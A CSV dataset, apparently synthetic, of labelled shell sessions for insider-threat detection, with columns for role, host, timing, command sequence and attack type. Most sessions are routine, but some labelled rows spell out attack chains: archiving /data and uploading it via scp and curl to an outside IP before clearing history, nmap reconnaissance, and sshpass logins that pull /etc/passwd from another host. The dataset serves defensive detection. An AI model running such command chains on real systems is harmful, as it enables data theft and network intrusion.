session_id,user_id,role,hostname,session_start,session_duration_s,after_hours,command_count,command_sequence,label,attack_type
8ee4dfbec4954fdf97dff8ef90d275da,u0018,analyst,dev-ws-01,2025-07-06 08:02:53,2461,0,25,"less /var/log/syslog -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/error.log | wc -l -> echo $USER -> du -sh /data/* -> ls -la -> less /var/log/syslog -> sqlite3 analytics.db 'SELECT COUNT(*) FROM audit;' -> cd ~ -> uptime -> cut -d',' -f4,8 /data/transactions.csv | head -> whoami -> cut -d',' -f4,8 /data/report.parquet | head -> grep -i 'warn' /var/log/error.log -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> ls -la -> echo $USER -> md5sum /data/report.parquet -> cut -d',' -f2,9 /data/customers.csv | head -> wc -l /data/users.db -> cat /data/model_weights.pkl -> du -sh /data/* -> sort -t',' -k5 -n /data/customers.csv | tail -<NUM> -> du -sh /data/* -> python -c 'import pandas as pd; df=pd.read_csv(""/data/users.db""); print(df.describe())' -> exit",0,none
a137e2612986468cbeceb93349a878dd,u0028,admin,analyst-ws-01,2025-07-06 09:05:05,1538,0,26,sudo ufw status verbose -> cat /var/log/syslog -> sudo apt update -> clear -> cat /var/log/debug.log -> whoami -> which git -> cd ~ -> sudo systemctl restart cron -> ping -c <NUM> <IP> -> sudo journalctl --since '4 days ago' | grep -i fail -> source ~/.bashrc -> sudo apt autoremove -y -> sudo -l -> tail -f /var/log/syslog -> sudo ufw status verbose -> groups -> whoami -> journalctl -u celery -n <NUM> -> ls -> cd ~ -> clear -> journalctl -xe --since '<NUM> hour ago' -> tar -czf /tmp/<TMPFILE> ~/ -> journalctl -u celery -n <NUM> -> exit,1,none
649722a0bfae4733a1c6434e9ec54083,u0060,admin,dev-ws-02,2025-07-06 14:29:40,3080,0,11,"ping -c <NUM> <IP> -> pwd -> traceroute <IP> -> netstat -tulpn -> sudo systemctl status celery -> python3 -c ""import base64; print(base64.b64decode('<HEX>'))"" -> sudo apt install -y htop -> which python -> uptime -> tar -czf /tmp/<TMPFILE> ~/ -> exit",1,none
90371eddef3c4c7c8c55dbb41aa95203,u0048,analyst,analyst-ws-02,2025-07-07 07:51:55,582,1,31,"whoami -> ls -lh -> sort -t',' -k1 -n /data/users.db | tail -<NUM> -> rsync -avz /data/ backup-<NUM>:/backup/data/ -> scp /tmp/<TMPFILE> archive-srv:/backup/ -> echo $USER -> rsync -avz /data/ build-agent:/backup/data/ -> ls -lh /data -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> wc -l /data/customers.csv -> md5sum /data/users.db -> history | tail -<NUM> -> less /var/log/audit.log -> echo $PATH -> tar -czf /tmp/<TMPFILE> ~/ -> groups -> ls -la ~/.aws/ -> sqlite3 analytics.db 'SELECT COUNT(*) FROM logs;' -> echo <HEX> | base64 -d -> pwd -> which git -> pwd -> cd ~ -> man sed -> echo $PATH -> source ~/.bashrc -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/nginx.log | wc -l -> grep -i 'fail' /var/log/syslog -> cd .. -> exit",1,none
60c917a2063643a3a42c190edb76058a,u0042,dev,analyst-ws-08,2025-07-07 08:10:20,1481,0,13,whoami -> ls -la ~/.ssh/ -> ping -c 4 <IP> -> tar -czf /tmp/<TMPFILE> ~/ -> cat config/dev.yaml -> make build -> find /home -name '*.pem' 2>/dev/null -> ls -la -> docker build -t myapp:62ea . -> grep -r 'TODO' src/ -> cd .. -> make test -> exit,1,none
76e25226c61646ec90c120b895e386bd,u0072,admin,dev-ws-13,2025-07-07 16:48:07,1943,0,17,sudo chown www-data /var/www/html -> sudo apt update -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> which git -> ping -c 5 <IP> -> sudo chmod <NUM> /etc/nginx/nginx.conf -> cd ~ -> ss -tlnp -> ping -c 7 <IP> -> ls -la -> ls -> ping -c <NUM> <IP> -> cat /var/log/audit.log -> sudo iptables -L -n -> uptime -> top -bn1 | head -<NUM> -> exit,0,none
6662e34406854fdfa35c2cacfa794c88,u0048,analyst,dev-ws-14,2025-07-07 17:52:57,304,0,13,"whoami -> python analyze.py --input /data/users.db -> sort -t',' -k3 -n /data/customers.csv | tail -<NUM> -> jupyter nbconvert --to script analysis_bac5.ipynb -> cd ~ -> uptime -> ls -la -> history | tail -<NUM> -> cat /data/model_weights.pkl -> whoami -> which python -> echo $USER -> exit",0,none
46dcc8f3da7540eb9da99dcb93e1dc51,u0070,admin,dev-ws-15,2025-07-07 18:57:37,121,0,20,sudo iptables -L -n -> last | head -<NUM> -> alias ll='ls -la' -> sudo systemctl restart cron -> sudo apt update -> sudo ufw status verbose -> crontab -l -> sudo ufw allow <NUM>/tcp -> clear -> ping -c 7 <IP> -> cd ~ -> pwd -> free -m -> date -> sudo nano /etc/hosts -> sudo -l -> ls -> who -> cd ~ -> exit,0,none
23d5f457adfe496994d80eba4f76d3bb,u0041,dev,admin-srv-08,2025-07-08 09:29:20,2768,0,22,whoami -> alias ll='ls -la' -> docker logs <HEX> --tail <NUM> -> alias ll='ls -la' -> black src/ -> ssh -i ~/.ssh/id_rsa deploy@backup-<NUM> -> ls -la -> make test -> history | tail -<NUM> -> git log --oneline -<NUM> -> pip install -r requirements.txt -> echo $PATH -> date -> cd ~ -> git checkout -b feature/<HEX> -> ls -la -> ls -lh -> uptime -> date -> find . -name '*.py' | xargs wc -l -> git pull origin main -> exit,0,none
451c331d2b5c494998c34c29bb1f42bf,u0076,admin,analyst-ws-08,2025-07-08 09:55:34,410,0,24,who -> whoami -> tail -f /var/log/syslog -> tar -czf /tmp/<TMPFILE> ~/ -> which python -> sudo apt install -y libssl-dev -> tail -f /var/log/syslog -> history | tail -<NUM> -> free -m -> sudo systemctl status redis -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> clear -> echo $USER -> ls -> sudo journalctl --since '3 days ago' | grep -i fail -> echo $USER -> top -bn1 | head -<NUM> -> history | tail -<NUM> -> free -m -> journalctl -xe --since '9 hour ago' -> which python -> sudo -l -> cat /var/log/syslog -> exit,1,none
2fbd965b49c5426a91ce7c3445961f79,u0055,dev,analyst-ws-04,2025-07-08 10:19:50,636,0,18,pwd -> docker build -t myapp:5cbb . -> python -m pytest tests/ -q -> black src/ -> env | grep -i auth -> black src/ -> python backup.sh -> docker ps -> git status -> python train.py -> cat /etc/cron.d/backup -> ls -la -> ss -antp -> make test -> grep -r 'TODO' src/ -> nano config/settings.yaml -> ls -la -> exit,1,none
28d1667570d94275ba6d053e86054372,u0021,admin,dev-ws-12,2025-07-08 10:23:27,3324,0,39,ping -c 5 <IP> -> who -> which python -> ls -> echo $USER -> ls -> cat /var/log/audit.log -> which python -> ping -c 5 <IP> -> sudo journalctl --since '2 days ago' | grep -i fail -> du -sh /var/log/* -> sudo systemctl status celery -> who -> uptime -> which python -> last | head -<NUM> -> sudo systemctl restart nginx -> source ~/.bashrc -> clear -> journalctl -xe --since '<NUM> hour ago' -> ls -lh -> sudo ufw status verbose -> netstat -tulpn -> dockr ps -> du -sh /var/log/* -> echo $PATH -> vmstat 1 5 -> sudo chown www-data /var/www/html -> find /data -name '*.db' -mtime -4 -> find /var/log -name '*.log' -size +3M -> tar -czf /tmp/<TMPFILE> /data/ 2>/dev/null -> split -b 187M /tmp/<TMPFILE> /tmp/<TMPFILE> -> scp /tmp/<TMPFILE> ubuntu@<IP>:/uploads/ -> curl -s -F 'file=@/tmp/<TMPFILE> http://<IP>:<NUM>/upload -> rm -f /tmp/<TMPFILE> /tmp/<TMPFILE> -> history -c -> uptime -> sudo ufw allow <NUM>/tcp -> exit,2,exfil
1cdb11e7ff8b46ef891c58a210852b35,u0019,analyst,admin-srv-01,2025-07-08 10:48:04,2620,0,15,"python -c 'import pandas as pd; df=pd.read_csv(""/data/report.parquet""); print(df.describe())' -> less /var/log/nginx.log -> less /var/log/access.log -> uptime -> python -c 'import pandas as pd; df=pd.read_csv(""/data/report.parquet""); print(df.describe())' -> pwd -> uptime -> sort -t',' -k3 -n /data/customers.csv | tail -<NUM> -> python analyze.py --input /data/embeddings.npy --output /tmp/<TMPFILE> -> which git -> cd .. -> whoami -> source ~/.bashrc -> less /var/log/audit.log -> exit",0,none
6d0d060c46304d7a957cdca39ffe376f,u0063,dev,dev-ws-07,2025-07-08 14:34:12,481,0,19,python ingest.py -> flake8 src/ --max-line-length <NUM> -> make test -> git pull origin main -> python backup.sh -> tail -f logs/debug.log -> pip install -r requirements.txt -> docker run --rm -p <NUM>:<NUM> myapp:latest -> ip neigh show -> grep -r 'TODO' src/ -> echo $PATH -> pip install sqlalchemy -> find . -name '*.py' | xargs wc -l -> source ~/.bashrc -> export DEBUG=false -> git status -> docker ps -> ping -c 8 <IP> -> exit,1,none
9549e954a52a42dd8979a72f28358ea5,u0062,dev,dev-ws-04,2025-07-08 16:22:59,742,0,13,alias ll='ls -la' -> which git -> cat logs/error.log -> cd ~/projects/etl-jobs -> md5sum /data/model_weights.pkl -> du -sh /data/* -> docker run --rm -p <NUM>:<NUM> myapp:latest -> python -m pytest tests/ -q -> python -m pytest tests/ -x -> which python -> pwd -> pytest tests/unit/ --cov=src --cov-report=term-missing -> exit,0,none
5abe65fb66cc4c72b29a883d2f09a6fa,u0011,admin,admin-srv-03,2025-07-09 11:46:49,402,0,15,last | head -<NUM> -> free -m -> iostat -x 1 3 -> whoami -> cat /var/log/debug.log -> sudo apt install -y net-tools -> alias ll='ls -la' -> which python -> iostat -x 1 3 -> ls -lh -> tail -f /var/log/syslog -> free -m -> sudo nano /etc/hosts -> sudo systemctl enable redis -> exit,0,none
3e6ddfb3519b4a3881e2739c66121339,u0048,analyst,analyst-ws-05,2025-07-09 13:25:38,1421,0,25,"sort -t',' -k4 -n /data/payroll.xlsx | tail -<NUM> -> psql -U analyst -c 'SELECT * FROM events LIMIT <NUM>;' -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> python analyze.py --input /data/model_weights.pkl --output /tmp/<TMPFILE> -> history | tail -<NUM> -> alias ll='ls -la' -> wc -l /data/payroll.xlsx -> uptime -> cd .. -> ls -la -> alias ll='ls -la' -> ls -lh /data -> source ~/.bashrc -> which git -> python analyze.py --input /data/payroll.xlsx -> uptime -> uptime -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/error.log | wc -l -> python analyze.py --input /data/users.db -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> ls -la -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT 8;' -> python analyze.py --input /data/report.parquet --output /tmp/<TMPFILE> -> jupyter nbconvert --to script analysis_386b.ipynb -> exit",0,none
0ad24e6b6ddc4e0aaad46ca6336a4980,u0028,admin,admin-srv-03,2025-07-09 15:59:49,275,0,16,sudo apt install -y auditd -> sudo -l -> top -bn1 | head -<NUM> -> sudo apt install -y htop -> sudo systemctl enable cron -> date -> sudo nano /etc/resolv.conf -> vmstat 1 5 -> man sed -> netstat -tulpn -> sudo chown www-data /var/www/html -> pwd -> sudo ufw status verbose -> crontab -l -> vmstat 1 5 -> exit,0,none
2d0a723de19b48f5b4dbd73eb9b616d0,u0018,analyst,analyst-ws-06,2025-07-10 09:15:06,1749,0,29,"sqlite3 analytics.db 'SELECT COUNT(*) FROM logs;' -> echo $PATH -> scp /tmp/<TMPFILE> nas-store:/backup/ -> which python -> ls -lh /data -> echo $PATH -> cat /data/users.db -> zip -r /tmp/<TMPFILE> /data/ -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> which git -> ls -la -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> which python -> sort -t',' -k5 -n /data/model_weights.pkl | tail -<NUM> -> du -sh /data/* -> which git -> sqlite3 analytics.db 'SELECT COUNT(*) FROM users;' -> du -sh /data/* -> head -<NUM> /data/transactions.csv -> echo $USER -> pwd -> ls -lh /data -> jupyter nbconvert --to script analysis_d2ed.ipynb -> python analyze.py --input /data/customers.csv -> cat /etc/cron.d/monitoring -> scp /tmp/<TMPFILE> dev-<NUM>:/backup/ -> cat ~/.gitconfig -> pwd -> exit",1,none
0b17167eadae42a0a6a52cf8c732f328,u0067,dev,dev-ws-09,2025-07-10 09:42:26,1035,0,16,which git -> arp -a -> export ENV=info -> cat /etc/group -> make build -> pip list --outdated -> ssh -i ~/.ssh/id_rsa deploy@log-collector -> ls -> groups -> docker logs <HEX> --tail <NUM> -> pip list --outdated -> make test -> ls -lh -> find /home -name '*.pfx' 2>/dev/null -> ip route show -> exit,1,none
9913fdcd259342608f5d346c09c1253c,u0051,analyst,analyst-ws-08,2025-07-10 10:27:16,660,0,29,"cd ~ -> ls -lh -> cat ~/.ssh/known_hosts -> uptime -> ls -lh -> wc -l /data/model_weights.pkl -> ls -lh /data -> ls -la -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> ls -lh -> alias ll='ls -la' -> ls -> man awk -> cd .. -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/debug.log | wc -l -> python analyze.py --input /data/transactions.csv --output /tmp/<TMPFILE> -> du -sh /data/* -> cp /etc/passwd /tmp/<TMPFILE> -> whoami -> cat /etc/cron.d/backup -> ls -la -> sort -t',' -k1 -n /data/transactions.csv | tail -<NUM> -> pwd -> history | tail -<NUM> -> awk '{print $1}' /var/log/syslog | sort | uniq -c | sort -rn | head -<NUM> -> alias ll='ls -la' -> groups -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/auth.log | wc -l -> exit",1,none
36beb88edbdf4e55903ebc04d0c27a1b,u0003,dev,analyst-ws-01,2025-07-10 14:14:32,2743,0,22,grep -r 'TODO' src/ -> python -m pytest tests/ -v -> cta README.md -> git log --oneline -<NUM> -> which python -> !! -> date -> docker run --rm -p <NUM>:<NUM> myapp:latest -> export DEBUG=false -> cd ~ -> git diff HEAD~2 -> git checkout -b feature/<HEX> -> which git -> nano config/settings.yaml -> pytest tests/unit/ --cov=src --cov-report=term-missing -> env | grep SECRET -> nano config/settings.yaml -> nano config/dev.yaml -> grep -r 'TODO' src/ -> git pull origin develop -> ssh -i ~/.ssh/id_rsa deploy@archive-srv -> exit,0,none
9bbc3d87d9894dd3836f675b5f20148f,u0010,dev,analyst-ws-08,2025-07-10 14:33:22,1704,0,42,cd .. -> git status -> docker build -t myapp:ebd6 . -> git pull origin main -> git checkout -b feature/<HEX> -> black src/ -> which python -> find . -name '*.py' | xargs wc -l -> cat /etc/passwd | grep -v nologin -> make build -> cat config/settings.yaml -> curl -s http://localhost:<NUM>/health -> which python -> git log --oneline -<NUM> -> python train.py -> whoami -> export LOG_LEVEL=info -> make test -> docker build -t myapp:b677 . -> clear -> docker ps -> ls -la -> whoami -> id -> uname -m -> cat /etc/os-release -> ip a -> ip route -> nmap -sV -p <NUM>-<NUM> <IP> -> cat /etc/hosts -> arp -a -> nmap -p- <IP> -T2 -> ps aux --sort=-%cpu | head -<NUM> -> cat /proc/version -> find / -writable -type d 2>/dev/null | head -<NUM> -> ls -la /opt/ -> cat /etc/crontab -> flake8 src/ --max-line-length <NUM> -> clear -> find . -name '*.py' | xargs wc -l -> man ls -> exit,2,recon
80590ea5050340a7bc2eea2ed79b9f42,u0068,analyst,analyst-ws-10,2025-07-10 17:47:04,3450,0,20,"clear -> python analyze.py --input /data/payroll.xlsx --output /tmp/<TMPFILE> -> psql -U analyst -c 'SELECT * FROM users LIMIT 6;' -> cut -d',' -f2,7 /data/transactions.csv | head -> cta README.md -> diff /data/customers.csv /backup/report.parquet -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> grep -i 'error' /var/log/access.log -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> psql -U analyst -c 'SELECT * FROM summary LIMIT 9;' -> history | tail -<NUM> -> ls -la -> scp /tmp/<TMPFILE> dev-<NUM>:/backup/ -> man awk -> python analyze.py --input /data/report.parquet -> grep -i 'fail' /var/log/nginx.log -> which git -> wc -l /data/model_weights.pkl -> less /var/log/syslog -> exit",0,none
73b5e9581e344557ac95b8af86687406,u0035,admin,dev-ws-10,2025-07-10 19:36:33,2334,1,26,sudo apt install -y htop -> echo $PATH -> sudo ufw allow <NUM>/tcp -> iostat -x 1 3 -> sudo -l -> sudo nano /etc/fstab -> free -m -> sudo ufw allow <NUM>/tcp -> ls -lh -> ls -lh -> ping -c 8 <IP> -> last | head -<NUM> -> ls -la -> sudo ufw allow <NUM>/tcp -> date -> df -h -> !! -> man ls -> date -> source ~/.bashrc -> uptime -> whoami -> source ~/.bashrc -> cd .. -> whoami -> exit,0,none
5161ce07d3ba4061838d7c7547bd5af9,u0073,dev,dev-ws-04,2025-07-11 08:46:42,2907,0,24,ls -la -> pwd -> pip list --outdated -> pip install -r requirements.txt -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> docker logs <HEX> --tail <NUM> -> pwd -> docker ps -> make test -> ls -la -> echo $PATH -> cd ~/projects/ml-pipeline -> ls -> git pull origin main -> cat config/settings.yaml -> export ENV=true -> echo $PATH -> docker ps -> nano config/prod.yaml -> docker run --rm -p <NUM>:<NUM> myapp:latest -> python -m pytest tests/ -q -> docker run --rm -p <NUM>:<NUM> myapp:latest -> ls -lh -> exit,0,none
0e7385935b504a5a82d3b67a887a45aa,u0000,dev,dev-ws-01,2025-07-11 09:34:17,609,0,17,cat logs/auth.log -> pip install -r requirements.txt -> ls -la -> sudp apt update -> uptime -> ls -la -> man sed -> black src/ -> grep -r 'TODO' src/ -> pip install -r requirements.txt -> cd ~/projects/recommendation-engine -> git stash -> grep -r 'TODO' src/ -> pip install paramiko -> black src/ -> export DEBUG=production -> exit,0,none
a69b9c19baed40adb163ee95f9f68b23,u0075,analyst,analyst-ws-05,2025-07-11 10:17:33,1864,0,26,psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> jupyter nbconvert --to script analysis_6585.ipynb -> python analyze.py --input /data/transactions.csv --output /tmp/<TMPFILE> -> alias ll='ls -la' -> cd .. -> ls -> less /var/log/app.log -> rsync -avz /data/ dev-<NUM>:/backup/data/ -> less /var/log/app.log -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> cat /data/transactions.csv -> cd .. -> jupyter nbconvert --to script analysis_21d6.ipynb -> id -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/access.log | wc -l -> ls -> sqlite3 analytics.db 'SELECT COUNT(*) FROM sessions;' -> nmap -sV <IP> -> less /var/log/nginx.log -> du -sh /data/* -> clear -> psql -U analyst -c 'SELECT * FROM users LIMIT 6;' -> alias ll='ls -la' -> ls -lh /data -> exit,0,none
ab04b0f47739419e95df07a1f5de934f,u0077,dev,dev-ws-04,2025-07-11 15:19:10,2251,0,11,git checkout -b feature/<HEX> -> tail -f logs/access.log -> vim ingest.py -> make build -> echo $PATH -> grep -r 'TODO' src/ -> find . -name '*.py' | xargs wc -l -> git pull origin main -> cat config/prod.yaml -> pip install -r requirements.txt -> exit,0,none
c555799a4530434c919a87c7b5121d54,u0019,analyst,admin-srv-01,2025-07-11 15:20:34,771,0,17,md5sum /data/payroll.xlsx -> !! -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> ls -la -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/nginx.log | wc -l -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> echo $PATH -> clear -> echo $PATH -> head -<NUM> /data/model_weights.pkl -> python analyze.py --input /data/embeddings.npy --output /tmp/<TMPFILE> -> pwd -> cd ~ -> cd .. -> ls -lh /data -> alias ll='ls -la' -> exit,0,none
642498e901304a8f8fce5d9b4b43b02e,u0012,dev,analyst-ws-02,2025-07-11 15:33:01,613,0,10,grep -r 'TODO' src/ -> git diff HEAD~2 -> git checkout -b feature/<HEX> -> alias ll='ls -la' -> zip -r /tmp/<TMPFILE> /data/ -> git status -> git pull origin develop -> pwd -> sudo -l -> exit,1,none
bc24e604f88e473b9af14a999b43722e,u0000,dev,analyst-ws-02,2025-07-11 15:48:10,440,0,29,cat ~/.gitconfig -> ls -la ~/.ssh/ -> git stash -> pwd -> which python -> git pull origin main -> which python -> git stash -> docker logs <HEX> --tail <NUM> -> python -m pytest tests/ -q -> uptime -> alias ll='ls -la' -> make build -> alias ll='ls -la' -> echo $PATH -> pytest tests/unit/ --cov=src --cov-report=term-missing -> tail -f logs/debug.log -> cd ~ -> man sed -> ls -lh -> pwd -> pwd -> cta README.md -> git checkout -b feature/<HEX> -> git status -> whoami -> whoami -> git checkout -b feature/<HEX> -> exit,1,none
c3bb82619fd5471cb57255940301caa2,u0025,dev,analyst-ws-06,2025-07-11 17:27:42,324,0,27,cd ~/projects/api-gateway -> date -> cat config/dev.yaml -> clear -> git diff HEAD~1 -> git log --oneline -<NUM> -> pip install sqlalchemy -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> man awk -> ls -la -> grep -r 'TODO' src/ -> cat config/prod.yaml -> git stash -> cd .. -> make test -> git log --oneline -<NUM> -> cat config/settings.yaml -> date -> env | grep API -> pip install boto3 -> ls -la -> find . -name '*.py' | xargs wc -l -> !! -> cd .. -> history | tail -<NUM> -> git diff HEAD~2 -> exit,0,none
ecdd05140d634b59acb83d7f89edde6b,u0067,dev,dev-ws-02,2025-07-12 08:24:53,2737,0,25,git pull origin develop -> source ~/.bashrc -> tail -f logs/access.log -> export DEBUG=info -> history | tail -<NUM> -> python analyze.py --input /data/customers.csv --output /tmp/<TMPFILE> -> head -<NUM> /data/customers.csv -> rsync -avz /data/ archive-srv:/backup/data/ -> tail -f logs/error.log -> history | tail -<NUM> -> find . -name '*.py' | xargs wc -l -> echo $PATH -> cd ~/projects/recommendation-engine -> source ~/.bashrc -> pytest tests/unit/ --cov=src --cov-report=term-missing -> docker ps -> cd ~/projects/recommendation-engine -> make test -> env | grep API -> git stash -> ls -> make test -> cd ~/projects/data-lake -> ls -> exit,0,none
967da26613964a9f848a7cadd7b5eb28,u0046,analyst,dev-ws-06,2025-07-12 08:49:06,956,0,30,"ls -lh -> echo $PATH -> pwd -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> uptime -> cut -d',' -f5,9 /data/model_weights.pkl | head -> awk '{print $1}' /var/log/app.log | sort | uniq -c | sort -rn | head -<NUM> -> rsync -avz /data/ dev-<NUM>:/backup/data/ -> pip list --outdated -> curl -s http://localhost:<NUM>/health -> cat logs/syslog -> less /var/log/syslog -> ls -lh -> md5sum /data/users.db -> jupyter nbconvert --to script analysis_c58f.ipynb -> python analyze.py --input /data/users.db -> ls -lh /data -> ls -lh /data -> scp /tmp/<TMPFILE> backup-<NUM>:/backup/ -> scp /tmp/<TMPFILE> nas-store:/backup/ -> history | tail -<NUM> -> echo $PATH -> cat /data/model_weights.pkl -> du -sh /data/* -> grep -i 'fail' /var/log/audit.log -> pwd -> which python -> alias ll='ls -la' -> man awk -> exit",0,none
131291a11940432188c7fdde748560df,u0021,admin,analyst-ws-10,2025-07-12 09:24:01,3203,0,36,clear -> uptime -> sudo ufw allow <NUM>/tcp -> top -bn1 | head -<NUM> -> ls -lh -> uptime -> history | tail -<NUM> -> sudo apt update -> cd ~ -> source ~/.bashrc -> sudo systemctl restart ssh -> journalctl -u nginx -n <NUM> -> date -> ls -la -> free -m -> which python -> last | head -<NUM> -> last | head -<NUM> -> which python -> netstat -tulpn -> ls -la -> df -h -> man find -> last | head -<NUM> -> cat /var/log/app.log -> date -> nmap -sS -p <NUM> <IP> --open -oN /tmp/<TMPFILE> -> ssh -o StrictHostKeyChecking=no deploy@<IP> -> ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa root@<IP> 'id; hostname' -> sshpass -p '<HEX>' ssh deploy@<IP> 'cat /etc/passwd' -> ps aux --sort=-%cpu | head -<NUM> -> scp deploy@<IP>:/etc/passwd /tmp/<TMPFILE> -> rm -f /tmp/<TMPFILE> -> sudo iptables -L -n -> tail -f /var/log/syslog -> exit,2,lateral__pivot
110526de34354a69b1925a2c0c106c41,u0076,admin,admin-srv-07,2025-07-12 10:57:09,805,0,13,cat ~/.gitconfig -> crontab -l -> history | tail -<NUM> -> echo $PATH -> echo $USER -> find /home -name '*.pfx' 2>/dev/null -> crontab -l -> sudo -l -> sudo systemctl restart gunicorn -> ss -antp -> ping -c 5 <IP> -> sudo -l -> exit,1,none
24b0c0a9ea204e5cb2e933bde3719be6,u0067,dev,analyst-ws-03,2025-07-12 12:06:04,3318,0,36,history | tail -<NUM> -> whoami -> pip install fastapi -> git pull origin main -> nano config/dev.yaml -> history | tail -<NUM> -> vim migrate.py -> git pull origin develop -> ls -lh -> ls -> flake8 src/ --max-line-length <NUM> -> whoami -> id -> uname -m -> cat /etc/os-release -> ip a -> ip route -> nmap -sV -p <NUM>-<NUM> <IP> -> cat /etc/hosts -> arp -a -> nmap -p- <IP> -T3 -> ps aux --sort=-%cpu | head -<NUM> -> cat /proc/version -> find / -writable -type d 2>/dev/null | head -<NUM> -> ls -la /opt/ -> cat /etc/crontab -> alias ll='ls -la' -> export DEBUG=false -> docker logs <HEX> --tail <NUM> -> git diff HEAD~2 -> uptime -> pip list --outdated -> pwd -> curl -s http://localhost:<NUM>/health -> cd .. -> exit,2,recon
0bd6fc9ed7534eb8b504c2fec590c841,u0035,admin,dev-ws-06,2025-07-12 14:04:58,3171,0,13,echo $PATH -> sudo ufw status verbose -> alias ll='ls -la' -> ss -tlnp -> echo $USER -> arp -a -> vmstat 1 5 -> sudo systemctl status gunicorn -> ip route show -> sudo apt autoremove -y -> ls -> sudo apt install -y libssl-dev -> exit,1,none
c307bc7abd0245efb131440cfccf25be,u0065,analyst,dev-ws-04,2025-07-12 17:55:30,1906,0,10,"ls -la -> head -<NUM> /data/model_weights.pkl -> sort -t',' -k2 -n /data/payroll.xlsx | tail -<NUM> -> head -<NUM> /data/customers.csv -> ls -la -> python analyze.py --input /data/model_weights.pkl -> alias ll='ls -la' -> cd ~ -> scp /tmp/<TMPFILE> nas-store:/backup/ -> exit",0,none
d009e5fd2d3c4e539b99f9bf79db080f,u0022,dev,analyst-ws-09,2025-07-12 18:55:12,2525,0,11,scp /tmp/<TMPFILE> log-collector:/backup/ -> wc -l /data/transactions.csv -> pip install -r requirements.txt -> vim sync.py -> which python -> git stash -> git checkout -b feature/<HEX> -> black src/ -> pip install pandas -> ls -la -> exit,0,none
8924c5a513f849d68de0067ac33c3a99,u0023,analyst,admin-srv-08,2025-07-13 08:44:53,1376,0,19,"du -sh /data/* -> alias ll='ls -la' -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> ls -la -> cut -d',' -f5,7 /data/transactions.csv | head -> python -c 'import pandas as pd; df=pd.read_csv(""/data/model_weights.pkl""); print(df.describe())' -> history | tail -<NUM> -> grep -i 'warn' /var/log/syslog -> which git -> whoami -> !! -> sudp apt update -> which git -> which python -> history | tail -<NUM> -> man ls -> which git -> date -> exit",0,none
